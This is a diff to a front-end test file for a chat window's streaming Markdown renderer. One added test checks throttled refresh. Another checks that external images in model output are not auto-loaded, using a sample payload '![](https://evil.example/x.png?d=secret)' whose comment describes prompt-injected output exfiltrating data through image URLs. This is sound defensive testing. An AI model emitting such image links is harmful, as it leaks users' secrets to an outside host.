@@ -7,8 +7,8 @@
  * 测试环境里首次 import 要现场转换整个 Markdown 依赖图，所以断言都留给足够长的等待窗口，
  * 并且只查 .md 容器里的结构（页面别处也有 <strong>，比如耗时文案）。
  */
-import { afterEach, describe, expect, it } from "vitest";
-import { cleanup, render, screen, waitFor } from "@testing-library/react";
+import { afterEach, describe, expect, it, vi } from "vitest";
+import { act, cleanup, render, screen, waitFor } from "@testing-library/react";
 import { ChatWindow } from "@/components/ChatWindow";
 import type { WebMessage } from "@/lib/types";
 
@@ -34,6 +34,36 @@ describe("streaming markdown rendering", () => {
 		expect(document.querySelectorAll(".md li").length).toBeGreaterThan(0);
 		// 不该把 Markdown 记号当纯文本留在界面上
 		expect(screen.queryByText(/\*\*加粗\*\*/)).toBeNull();
+	}, 30_000);
+
+	it("keeps refreshing while text keeps arriving (throttle, not debounce)", async () => {
+		// 回归：旧实现每次文本变化都清掉计时器重来，流式期间（约 16ms 一段）正文一直停在第一段
+		const { StreamingMarkdownBlock } = await import("@/components/MarkdownBlock");
+		vi.useFakeTimers();
+		try {
+			const { rerender, container } = render(<StreamingMarkdownBlock text="第0段" />);
+			for (let i = 1; i <= 20; i += 1) {
+				rerender(<StreamingMarkdownBlock text={`第${i}段`} />);
+				act(() => { vi.advanceTimersByTime(20); });
+			}
+			const shown = Number(/第(\d+)段/.exec(container.textContent ?? "")?.[1]);
+			expect(shown).toBeGreaterThanOrEqual(15);
+		} finally {
+			vi.useRealTimers();
+		}
+	}, 30_000);
+
+	it("does not load external images until the user asks for it", async () => {
+		// 被注入的模型输出可以用 ![](https://evil/?d=…) 把内容带出去：渲染时不能自动发请求
+		const { MarkdownBlock } = await import("@/components/MarkdownBlock");
+		const { container } = render(<MarkdownBlock text={"![秘密](https://evil.example/x.png?d=secret)\n\n![本地](/local.png)"} />);
+		await waitFor(() => expect(container.querySelector(".md")).toBeTruthy(), { timeout: MARKDOWN_READY_TIMEOUT_MS });
+		// 同源图片照常显示
+		const images = [...container.querySelectorAll("img")].map((img) => img.getAttribute("src"));
+		expect(images).toEqual(["/local.png"]);
+		const button = screen.getByTitle("https://evil.example/x.png?d=secret");
+		act(() => { button.click(); });
+		expect([...container.querySelectorAll("img")].map((img) => img.getAttribute("src"))).toContain("https://evil.example/x.png?d=secret");
 	}, 30_000);
 
 	it("keeps rendering markdown after the stream settles", async () => {
